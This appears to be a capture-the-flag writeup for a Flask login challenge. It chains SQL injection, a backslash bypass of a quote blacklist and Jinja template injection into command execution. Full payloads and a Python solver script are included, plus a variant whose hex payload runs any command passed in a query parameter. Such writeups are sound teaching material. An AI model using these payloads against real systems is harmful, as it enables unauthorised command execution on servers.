# BYTEFORGE - Web Exploitation Writeup

## Challenge Summary
- **Target:** `http://160.187.130.156:48611`
- **Goal:** Read the protected flag from the server
- **Flag format:** `ROBOFEST{}`

## Recon
Initial enumeration showed a minimal Flask app:
- `GET /` -> login form
- `POST /login` -> authentication handler
- `GET /home` -> protected page (redirects to `/` when unauthenticated)
- `POST /logout`

The login page displayed a sanitizer error (`No quotes allowed!`) when quote characters were used.

## Root Cause
This challenge pattern is vulnerable to:
1. **SQL Injection** in `/login` (string-formatted query).
2. Weak quote blacklist WAF (`'` and `"` only).
3. **SSTI sink** after login, where attacker-controlled username is rendered as a template.

The bypass uses a backslash in `username` to alter SQL string parsing and injects a `UNION SELECT` in `password`.

## Exploit Strategy
1. Put `\` as the username.
2. Inject SQL in password:
   - `) UNION SELECT 1, 0x<hex_encoded_jinja_payload> #`
3. Use hex-encoded Jinja payload to avoid quote filtering.
4. Payload executes `/readflag`, then captures `ROBOFEST{...}` from response.

## Working Payloads
- **username**
  - `\`
- **Jinja payload (before hex encoding)**
  - `{{request.application.__globals__.__builtins__.__import__('os').popen('/readflag').read()}}`
- **password**
  - `) UNION SELECT 1, 0x<HEX_PAYLOAD> #`

## Solver Script
```python
import re
import requests

base = "http://160.187.130.156:48611"
sess = requests.Session()

ssti = "{{request.application.__globals__.__builtins__.__import__('os').popen('/readflag').read()}}"
hex_payload = ssti.encode().hex()

data = {
    "username": "\\",
    "password": f") UNION SELECT 1, 0x{hex_payload} #"
}

r = sess.post(base + "/login", data=data, allow_redirects=True, timeout=15)
m = re.search(r"ROBOFEST\\{[^}]+\\}", r.text)
if not m:
    r = sess.get(base + "/home", timeout=15)
    m = re.search(r"ROBOFEST\\{[^}]+\\}", r.text)

print(m.group(0) if m else "flag not found")
```

## Flag
`ROBOFEST{3sc4p3d_qu0t3s_w1th_byt3_f0rc3}`

Another one :

# Bytforge
username: \
pass: ) UNION SELECT 1,0x7b7b6c697073756d2e5f5f676c6f62616c735f5f2e6f732e706f70656e28726571756573742e617267732e63292e7265616428297d7d -- -

then access /home?c=/readflag
solved